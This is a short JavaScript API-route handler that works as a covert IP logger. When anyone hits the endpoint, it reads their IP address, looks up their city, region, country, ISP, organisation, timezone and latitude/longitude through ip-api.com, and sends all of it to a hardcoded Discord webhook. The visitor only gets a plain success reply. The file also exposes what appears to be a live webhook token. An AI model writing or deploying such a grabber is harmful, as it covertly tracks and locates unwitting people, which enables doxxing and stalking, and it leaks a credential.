export default async function handler(req, res) {
    const ip =
        req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress;

    const ipAPI = `http://ip-api.com/json/${ip}`;
    const webhookURL = "https://discord.com/api/webhooks/1376717625169543228/-M_cKWR5l4Xra3BALwxfrjsWKedUdUV-6focu5z9ohrHZI8bq7YAnRNtdIuKUjdypJ9J"; // Replace this

    try {
        const response = await fetch(ipAPI);
        const ipInfo = await response.json();

        if (!ipInfo || ipInfo.status !== "success") {
            throw new Error("Failed to retrieve valid IP info.");
        }

        const {
            query,
            city,
            regionName,
            country,
            isp,
            org,
            timezone,
            lat,
            lon
        } = ipInfo;

        const payload = {
            content: `**IP Address Info**:
- IP: ${query}
- ISP: ${isp}
- Organization: ${org}
- Location: ${city}, ${regionName}, ${country}
- Timezone: ${timezone}
- Coordinates: Latitude ${lat}, Longitude ${lon}`
        };

        const discordRes = await fetch(webhookURL, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(payload)
        });

        if (!discordRes.ok) {
            console.error("Discord webhook error:", await discordRes.text());
        }

        res.status(200).json({ success: true });
    } catch (error) {
        console.error("Error:", error);
        res.status(500).json({ error: "Something went wrong." });
    }
}
